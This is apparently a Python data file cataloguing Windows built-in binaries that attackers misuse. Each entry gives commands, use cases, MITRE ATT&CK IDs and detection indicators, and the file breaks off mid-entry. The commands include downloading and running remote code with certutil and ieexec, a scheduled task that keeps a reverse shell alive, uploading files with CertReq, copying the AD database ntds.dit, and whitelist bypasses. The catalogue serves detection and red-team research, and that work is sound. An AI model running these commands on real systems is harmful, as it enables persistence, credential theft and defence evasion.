#!/usr/bin/env python3
"""
Summary: Storage of the binaires to be referenced.

Description: Storage of the binaries to be referenced.
"""

# Standard Python Libraries
import datetime

functions = {
    "ads": "Alternate data streams",
    "execute": "Execute",
    "reconnaissance": "Recon",
    "uac bypass": "UAC Bypass",
    "upload": "Upload",
    "download": "Download",
    "dump": "Dump",
    "credentials": "Creds",
    "copy": "Copy",
    "compile": "Compile",
    "awl bypass": "AWL Bypass",
    "encode": "Encode",
    "decode": "Decode",
}

refs = {
    "Binaries": [
        {
            "Name": "Schtasks.exe",
            "Description": "Schedule periodic tasks",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\\some\\directory\\revshell.exe',
                    "Description": "Create a recurring task to execute every minute.",
                    "Usecase": "Create a recurring task, to eg. to keep reverse shell session(s) alive",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1053",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1053",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\schtasks.exe"},
                {"Path": "c:\\windows\\syswow64\\schtasks.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "Services that gets created"}],
            "Resources": [
                {
                    "Link": "https://isc.sans.edu/forums/diary/Adding+Persistence+Via+Scheduled+Tasks/23633/"
                }
            ],
            "Acknowledgement": [{"Person": None, "Handle": None}],
            "pname": "schtasks",
        },
        {
            "Name": "AppInstaller.exe",
            "Description": "Tool used for installation of AppX/MSIX applications on Windows 10",
            "Author": "Wade Hickey",
            "Created": "2020-12-02",
            "Commands": [
                {
                    "Command": "start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw",
                    "Description": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>",
                    "Usecase": "Download file from Internet",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\AppInstaller.exe"
                }
            ],
            "Resources": [
                {"Link": "https://twitter.com/notwhickey/status/1333900137232523264"}
            ],
            "Acknowledgement": [
                {"Person": "Wade Hickey", "Handle": "AT_SYMBOLnotwhickey"}
            ],
            "pname": "appinstaller",
        },
        {
            "Name": "Gpscript.exe",
            "Description": "Used by group policy to process scripts",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Gpscript /logon",
                    "Description": "Executes logon scripts configured in Group Policy.",
                    "Usecase": "Add local group policy logon script to execute file and hide from defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "Administrator",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "Gpscript /startup",
                    "Description": "Executes startup scripts configured in Group Policy",
                    "Usecase": "Add local group policy logon script to execute file and hide from defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "Administrator",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\gpscript.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\gpscript.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Scripts added in local group policy"},
                {"IOC": "Execution of Gpscript.exe after logon"},
            ],
            "Resources": [
                {
                    "Link": "https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/"
                }
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "gpscript",
        },
        {
            "Name": "CertReq.exe",
            "Description": "Used for requesting and managing certificates",
            "Author": "David Middlehurst",
            "Created": "2020-07-07",
            "Commands": [
                {
                    "Command": "CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt",
                    "Description": "Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory",
                    "Usecase": "Download file from Internet",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal",
                    "Description": "Send the file c:\\windows\\win.ini to the endpoint https://example.org/ via HTTP POST",
                    "Usecase": "Upload",
                    "Category": "Upload",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\certreq.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\certreq.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "certreq creates new files"},
                {"IOC": "certreq makes POST requests"},
            ],
            "Resources": [{"Link": "https://dtm.uk/certreq"}],
            "Acknowledgement": [
                {"Person": "David Middlehurst", "Handle": "AT_SYMBOLdtmsecurity"}
            ],
            "pname": "certreq",
        },
        {
            "Name": "Runonce.exe",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Runonce.exe /AlternateShellStartup",
                    "Description": "Executes a Run Once Task that has been configured in the registry",
                    "Usecase": "Persistence, bypassing defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "Administrator",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\runonce.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\runonce.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\YOURKEY"
                }
            ],
            "Resources": [
                {"Link": "https://twitter.com/pabraeken/status/990717080805789697"},
                {"Link": "https://cmatskas.com/configure-a-runonce-task-on-windows/"},
            ],
            "Acknowledgement": [
                {"Person": "Pierre-Alexandre Braeken", "Handle": "AT_SYMBOLpabraeken"}
            ],
            "pname": "runonce",
        },
        {
            "Name": "Certutil.exe",
            "Description": "Windows binary used for handeling certificates",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe",
                    "Description": "Download and save 7zip to disk in the current folder.",
                    "Usecase": "Download file from Internet",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe",
                    "Description": "Download and save 7zip to disk in the current folder.",
                    "Usecase": "Download file from Internet",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt",
                    "Description": "Download and save a PS1 file to an Alternate Data Stream (ADS).",
                    "Usecase": "Download file from Internet and save it in an NTFS Alternate Data Stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/techniques/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "certutil -encode inputFileName encodedOutputFileName",
                    "Description": "Command to encode a file using Base64",
                    "Usecase": "Encode files to evade defensive measures",
                    "Category": "Encode",
                    "Privileges": "User",
                    "MitreID": "T1027",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1027",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "certutil -decode encodedInputFileName decodedOutputFileName",
                    "Description": "Command to decode a Base64 encoded file.",
                    "Usecase": "Decode files to evade defensive measures",
                    "Category": "Decode",
                    "Privileges": "User",
                    "MitreID": "T1140",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1140",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "certutil --decodehex encoded_hexadecimal_InputFileName",
                    "Description": "Command to decode a hexadecimal-encoded file decodedOutputFileName",
                    "Usecase": "Decode files to evade defensive measures",
                    "Category": "Decode",
                    "Privileges": "User",
                    "MitreID": "T1140",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1140",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\certutil.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\certutil.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Certutil.exe creating new files on disk"},
                {"IOC": "Useragent Microsoft-CryptoAPI/10.0"},
                {"IOC": "Useragent CertUtil URL Agent"},
            ],
            "Resources": [
                {"Link": "https://twitter.com/Moriarty_Meng/status/984380793383370752"},
                {
                    "Link": "https://twitter.com/mattifestation/status/620107926288515072"
                },
                {"Link": "https://twitter.com/egre55/status/1087685529016193025"},
            ],
            "Acknowledgement": [
                {"Person": "Matt Graeber", "Handle": "AT_SYMBOLmattifestation"},
                {"Person": "Moriarty", "Handle": "AT_SYMBOLMoriarty_Meng"},
                {"Person": "egre55", "Handle": "AT_SYMBOLegre55"},
                {"Person": "Lior Adar"},
            ],
            "pname": "certutil",
        },
        {
            "Name": "Ieexec.exe",
            "Description": "The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "ieexec.exe http://x.x.x.x:8080/bypass.exe",
                    "Description": "Downloads and executes bypass.exe from the remote server.",
                    "Usecase": "Download and run attacker code from remote location",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "ieexec.exe http://x.x.x.x:8080/bypass.exe",
                    "Description": "Downloads and executes bypass.exe from the remote server.",
                    "Usecase": "Download and run attacker code from remote location",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ieexec.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ieexec.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/"
                }
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "ieexec",
        },
        {
            "Name": "Csc.exe",
            "Description": "Binary file used by .NET to compile C# code",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "csc.exe -out:My.exe File.cs",
                    "Description": "Use CSC.EXE to compile C# code stored in File.cs and output the compiled version to My.exe.",
                    "Usecase": "Compile attacker code on system. Bypass defensive counter measures.",
                    "Category": "Compile",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "csc -target:library File.cs",
                    "Description": "Use CSC.EXE to compile C# code stored in File.cs and output the compiled version to a dll file.",
                    "Usecase": "Compile attacker code on system. Bypass defensive counter measures.",
                    "Category": "Compile",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Csc.exe"},
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Csc.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Csc.exe should normally not run a system unless it is used for development."
                }
            ],
            "Resources": [
                {
                    "Link": "https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe"
                }
            ],
            "Acknowledgement": [{"Person": None, "Handle": None}],
            "pname": "csc",
        },
        {
            "Name": "Msbuild.exe",
            "Description": "Used to compile and execute code",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "msbuild.exe pshell.xml",
                    "Description": "Build and execute a C# project stored in the target XML file.",
                    "Usecase": "Compile and run code",
                    "Category": "AWL bypass",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "msbuild.exe project.csproj",
                    "Description": "Build and execute a C# project stored in the target csproj file.",
                    "Usecase": "Compile and run code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Msbuild.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Msbuild.exe"
                },
                {"Path": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\Msbuild.exe"},
                {"Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\Msbuild.exe"},
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Msbuild.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Msbuild.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Msbuild.exe should not normally be executed on workstations"}
            ],
            "Resources": [
                {
                    "Link": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127/T1127.md"
                },
                {"Link": "https://github.com/Cn33liz/MSBuildShell"},
                {
                    "Link": "https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/"
                },
                {
                    "Link": "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/"
                },
            ],
            "Acknowledgement": [
                {"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"},
                {"Person": "Cn33liz", "Handle": "AT_SYMBOLCneelis"},
            ],
            "pname": "msbuild",
        },
        {
            "Name": "Netsh.exe",
            "Description": "Netsh is a Windows tool used to manipulate network interface settings.",
            "Author": "Freddie Barr-Smith",
            "Created": "2019-12-24",
            "Commands": [
                {
                    "Command": "netsh.exe add helper C:\\Users\\User\\file.dll",
                    "Description": "Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called",
                    "Usecase": "Proxy execution of .dll",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1128",
                    "MitreLink": "https://attack.mitre.org/techniques/T1128/",
                    "OperatingSystem": "Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\WINDOWS\\System32\\Netsh.exe"},
                {"Path": "C:\\WINDOWS\\SysWOW64\\Netsh.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "Netsh initiating a network connection"}],
            "Resources": [
                {"Link": "https://freddiebarrsmith.com/trix/trix.html"},
                {
                    "Link": "https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html"
                },
                {"Link": "https://liberty-shell.com/sec/2018/07/28/netshlep/"},
            ],
            "Acknowledgement": [
                {"Person": "Freddie Barr-Smith", "Handle": None},
                {"Person": "Riccardo Spolaor", "Handle": None},
                {"Person": "Mariano Graziano", "Handle": None},
                {"Person": "Xabier Ugarte-Pedrero", "Handle": None},
            ],
            "pname": "netsh",
        },
        {
            "Name": "Replace.exe",
            "Description": "Used to replace file with another file",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "replace.exe C:\\Source\\File.cab C:\\Destination /A",
                    "Description": "Copy file.cab to destination",
                    "Usecase": "Copy files",
                    "Category": "Copy",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A",
                    "Description": "Download/Copy bar.exe to outdir",
                    "Usecase": "Download file",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\replace.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\replace.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "Replace.exe getting files from remote server"}],
            "Resources": [
                {"Link": "https://twitter.com/elceef/status/986334113941655553"},
                {"Link": "https://twitter.com/elceef/status/986842299861782529"},
            ],
            "Acknowledgement": [{"Person": "elceef", "Handle": "AT_SYMBOLelceef"}],
            "pname": "replace",
        },
        {
            "Name": "Dfsvc.exe",
            "Description": "ClickOnce engine in Windows used by .NET",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo",
                    "Description": "Executes click-once-application from Url",
                    "Usecase": "Use binary to bypass Application whitelisting",
                    "Category": "AWL bypass",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Dfsvc.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Dfsvc.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Dfsvc.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Dfsvc.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf"
                },
                {
                    "Link": "https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe"
                },
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "dfsvc",
        },
        {
            "Name": "Esentutl.exe",
            "Description": "Binary for working with Microsoft Joint Engine Technology (JET) database",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o",
                    "Description": "Copies the source VBS file to the destination VBS file.",
                    "Usecase": "Copies files from A to B",
                    "Category": "Copy",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o",
                    "Description": "Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.",
                    "Usecase": "Copy file and hide it in an alternate data stream as a defensive counter measure",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "esentutl.exe /y C:\\ADS\\file.txt:file.exe /d c:\\ADS\\file.exe /o",
                    "Description": "Copies the source Alternate Data Stream (ADS) to the destination EXE.",
                    "Usecase": "Extract hidden file within alternate data streams",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "esentutl.exe /y \\\\192.168.100.100\\webdav\\file.exe /d c:\\ADS\\file.txt:file.exe /o",
                    "Description": "Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.",
                    "Usecase": "Copy file and hide it in an alternate data stream as a defensive counter measure",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o",
                    "Description": "Copies the source EXE to the destination EXE file",
                    "Usecase": "Use to copy files from one unc path to another",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit",
                    "Description": "Copies a (locked) file using Volume Shadow Copy",
                    "Usecase": "Copy/extract a locked file such as the AD Database",
                    "Category": "Copy",
                    "Privileges": "Admin",
                    "MitreID": "T1003",
                    "MitreLink": "https://attack.mitre.org/techniques/T1003/",
                    "OperatingSystem": "Windows 10, Windows 2016 Server, Windows 2019 Server",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\esentutl.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\esentutl.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/egre55/status/985994639202283520"},
                {
                    "Link": "https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/"
                },
                {"Link": "https://twitter.com/bohops/status/1094810861095534592"},
            ],
            "Acknowledgement": [
                {"Person": "egre55", "Handle": "AT_SYMBOLegre55"},
                {"Person": "Mike Cary", "Handle": "grayfold3d"},
            ],
            "pname": "esentutl",
        },
        {
            "Name": "vbc.exe",
            "Description": "Binary file used for compile vbs code",
            "Author": "Lior Adar",
            "Created": "27/02/2020",
            "Commands": [
                {
                    "Command": "vbc.exe /target:exe c:\\temp\\vbs\\run.vb",
                    "Description": "Binary file used by .NET to compile vb code to .exe",
                    "Usecase": "Compile attacker code on system. Bypass defensive counter measures.",
                    "Category": "Compile",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/techniques/T1127/",
                    "OperatingSystem": "Windows 10,7",
                },
                {
                    "Command": "vbc -reference:Microsoft.VisualBasic.dll c:\\temp\\vbs\\run.vb",
                    "Description": "Description of the second command",
                    "Usecase": "A description of the usecase",
                    "Category": "Compile",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/techniques/T1127/",
                    "OperatingSystem": "Windows 10,7",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe"
                },
                {"Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\vbc.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Acknowledgement": [
                {"Person": "Lior Adar", "Handle": None},
                {"Person": "Hai Vaknin(Lux)", "Handle": None},
            ],
            "pname": "vbc",
        },
        {
            "Name": "Cscript.exe",
            "Description": "Binary used to execute scripts in Windows",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "cscript c:\\ads\\file.txt:script.vbs",
                    "Description": "Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).",
                    "Usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\cscript.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\cscript.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Cscript.exe executing files from alternate data streams"}
            ],
            "Resources": [
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                },
                {
                    "Link": "https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/"
                },
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "cscript",
        },
        {
            "Name": "Installutil.exe",
            "Description": "The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll",
                    "Description": "Execute the target .NET DLL or EXE.",
                    "Usecase": "Use to execute code and bypass application whitelisting",
                    "Category": "AWL bypass",
                    "Privileges": "User",
                    "MitreID": "T1118",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1118",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll",
                    "Description": "Execute the target .NET DLL or EXE.",
                    "Usecase": "Use to execute code and bypass application whitelisting",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1118",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1118",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/"
                },
                {
                    "Link": "https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12"
                },
                {
                    "Link": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1118/T1118.md"
                },
                {
                    "Link": "https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/"
                },
                {
                    "Link": "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/"
                },
                {
                    "Link": "https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool"
                },
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "installutil",
        },
        {
            "Name": "Dllhost.exe",
            "Description": "Used by Windows to DLL Surrogate COM Objects",
            "Author": "Nasreddine Bencherchali",
            "Created": "2020-11-07",
            "Commands": [
                {
                    "Command": "dllhost.exe /Processid:{CLSID}",
